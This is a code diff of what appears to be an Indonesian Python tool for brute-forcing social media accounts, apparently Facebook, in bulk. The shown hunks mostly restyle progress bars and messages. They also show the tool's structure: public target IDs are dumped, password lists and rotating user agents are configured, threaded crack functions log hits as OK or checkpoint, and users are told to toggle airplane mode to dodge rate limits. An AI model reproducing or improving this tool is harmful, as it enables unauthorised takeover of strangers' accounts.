@@ -431,7 +431,7 @@ def dump_massal():
 	for met in range(baz_coder):
 		baz+=1
 		cetak(panel(f' Id Target Harus Bersifat Publik',width=70,title=f"",style=f"{warna_kolor}"))
-		bazfaa = input(f'Id Ke '+str(baz)+' : ')
+		bazfaa = input(f'Id '+str(baz)+' : ')
 		uid.append(bazfaa)
 	for userr in uid:
 		try:
@@ -515,6 +515,7 @@ def setting():
 			pwn.append(xpw)
 	else:
 		pwt.append('no')
+		
 	cetak(panel(f' Ingin Menambahkan User Agent Y/t',width=70,title=f"",style=f"{warna_kolor}"))
 	uat = input(f'Pilih : ')
 	if uat in ['y','Ya','ya','Y']:
@@ -527,12 +528,13 @@ def setting():
 	
 #
 def wordlist():
-	cetak(panel(f'           [white]Hasil [green]OK[white] Save in : [green]OK/%s [white]'%(okc),width=70,title=f"",style=f"{warna_kolor}"))
-	cetak(panel(f'           [white]Hasil [yellow]CP[white] Save in : [yellow]CP/%s [white]'%(cpc),width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'           [white]Hasil [green]OK[white] Tersimpan Di : [green]OK/%s [white]'%(okc),width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'           [white]Hasil [yellow]CP[white] Tersimpan Di : [yellow]CP/%s [white]'%(cpc),width=70,title=f"",style=f"{warna_kolor}"))
 	cetak(panel(f'      [cyan]On/Of Mode Pesawat Setiap 400 Id Agar Tidak Terkena Spam',width=70,title=f"",subtitle=f"",style=f"{warna_kolor}"))
 	print('')
 	global prog,des
-	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
+	prog = Progress(SpinnerColumn('monkey'),TextColumn('{task.description}'),BarColumn(bar_width=23),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
+	des = prog.add_task('',total=len(id2))
 	with tred(max_workers=30) as pool:
 		for basid in id2:
 			idf,nmf = basid.split('|')[0],basid.split('|')[1].lower()
@@ -572,10 +574,7 @@ def wordlist():
 #
 def crackm(idf,pwv):
 	global loop,ok,cp
-	bi = random.choice(['\33[m'])
-	pers = loop*100/len(id2)
-	fff = '%'
-	prog.update(des,description=f'crack [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
 	prog.advance(des)
 	ua = random.choice(ugenm)
 	ses = requests.Session()
@@ -613,10 +612,7 @@ def crackm(idf,pwv):
 #
 def crackb(idf,pwv):
 	global loop,ok,cp
-	bi = random.choice(['\33[m'])
-	pers = loop*100/len(id2)
-	fff = '%'
-	prog.update(des,description=f'crack [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
 	prog.advance(des)
 	ua = random.choice(ugenb)
 	ses = requests.Session()
@@ -667,10 +663,7 @@ def crackb(idf,pwv):
 #
 def crackf(idf,pwv):
 	global loop,ok,cp
-	bi = random.choice(['\33[m'])
-	pers = loop*100/len(id2)
-	fff = '%'
-	prog.update(des,description=f'crack [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
+	prog.update(des,description=f"[white]crack {str(loop)}/{len(id2)} OK-: [bold green]{ok}[/] CP-: [bold yellow]{cp}[/]")
 	prog.advance(des)
 	ua = random.choice(ugenf)
 	ses = requests.Session()
